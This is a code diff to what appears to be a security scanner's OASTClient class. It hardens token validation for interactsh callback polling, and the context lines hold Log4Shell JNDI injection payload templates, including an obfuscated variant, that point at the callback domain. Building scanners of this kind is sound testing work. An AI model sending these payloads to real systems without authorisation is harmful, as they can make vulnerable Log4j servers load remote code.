@@ -117,22 +117,31 @@ class OASTClient:
   if prefix and not re.fullmatch(r"[a-z0-9-]{1,32}", prefix.lower()):
    raise ValueError("OAST payload prefix may contain only letters, digits and hyphens")
   token = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
-  full = f"{prefix.lower()}-{token}.{self.server}" if prefix else f"{token}.{self.server}"
-  self._tokens[token] = {
+  token_label = f"{prefix.lower()}-{token}" if prefix else token
+  full = f"{token_label}.{self.server}"
+  self._tokens[token_label] = {
    "full": full,
    "registered_at": time.time(),
    "hits": [],
   }
   return f"http://{full}/"
 
+ def _registered_domain(self, token: str) -> str:
+  domain_part = token.split(".")[0] if "." in token else token
+  if not re.fullmatch(r"[a-z0-9-]{12,48}", domain_part):
+   raise ValueError("Invalid OAST token")
+  record = self._tokens.get(domain_part)
+  if record is None:
+   raise ValueError("OAST token was not registered by this client")
+  if token not in {domain_part, record["full"]}:
+   raise ValueError("OAST token does not match a registered interaction")
+  return record["full"]
+
  async def poll(self, token: str, timeout: int = 30) -> list[dict[str, Any]]:
   """Poll interactsh for a token created by this client."""
-  domain_part = token.split(".")[0] if "." in token else token
-  if not re.fullmatch(r"[a-z0-9]{12,16}", domain_part):
-   raise ValueError("Invalid OAST token")
-  if domain_part not in self._tokens:
-   raise ValueError("OAST token was not registered by this client")
-  if timeout < 0 or timeout > 300:
+  full_domain = self._registered_domain(token)
+  domain_part = full_domain.split(".")[0]
+  if isinstance(timeout, bool) or not isinstance(timeout, int) or timeout < 0 or timeout > 300:
    raise ValueError("OAST poll timeout must be between 0 and 300 seconds")
   hits: list[dict[str, Any]] = []
   deadline = time.monotonic() + timeout
@@ -175,7 +184,7 @@ class OASTClient:
 
  def get_log4shell_payloads(self, token: str) -> list[str]:
   """Get Log4Shell JNDI payloads pointing to OAST token."""
-  domain = token if "." in token else f"{token}.{self.server}"
+  domain = self._registered_domain(token)
   return [
    f"${{jndi:ldap://{domain}/a}}",
    f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
